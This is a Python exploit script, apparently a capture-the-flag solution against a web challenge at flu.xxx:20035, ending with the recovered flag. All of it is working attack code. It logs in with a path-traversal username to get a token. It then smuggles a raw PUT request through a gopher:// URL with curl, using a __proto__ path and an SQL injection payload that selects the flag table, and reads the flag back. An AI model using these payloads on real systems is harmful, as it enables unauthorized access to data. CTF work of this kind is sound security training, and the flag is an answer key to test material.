#!/usr/bin/python3
import requests
import json
import subprocess
import urllib.parse
import re

url = "http://flu.xxx:20035"

def get_token(session) -> str:
	data = {"username":"../../../../health#::txId", "password":"anything"}
	resp = session.post(url + "/api/auth/login", json=data)
	token = json.loads(resp.text)['token']
	return token

def get_flag(session, token):
	payload = "'||(select flag from flag)||'".replace(" ", "%2520")
	craft_path =  url + '/api/priv/assets/__proto__/' + payload
	craft_request = f"PUT {craft_path} HTTP/1.1\nHost: flu.xxx:20035\nAuthorization: {token}\n\n\n"
	final_url = "gopher://flu.xxx:20035/_" + craft_request.replace(" ", "%20").replace("\n", "%0a")
	print("[!] Sending craft request with path as full url")
	resp = subprocess.run(['curl', final_url, "-s"], stdout=subprocess.PIPE)
	id = re.findall(r'{"id":(.*)}', resp.stdout.decode("utf-8"))[0]

	assert id != ""
	print("[+] Your id transaction: " + id)
	headers = {'Authorization': token}

	print("[!] Try to read flag")
	resp = session.get(url + "/api/transactions/" + id, headers=headers)
	
	flag = "flag{" + re.findall(r'flag{(.*)}"', resp.text)[0] + "}"

	assert flag != ""
	return flag


if __name__ == "__main__":
	r = requests.Session()
	print("[!] Try to get token")
	token = get_token(r)

	assert token != ""
	print("[+] Your token: " + token)

	flag = get_flag(r, token)
	print("[+] Your flag: " + flag)
  
#FLAG: flag{finally_i_can_invest_in_js}
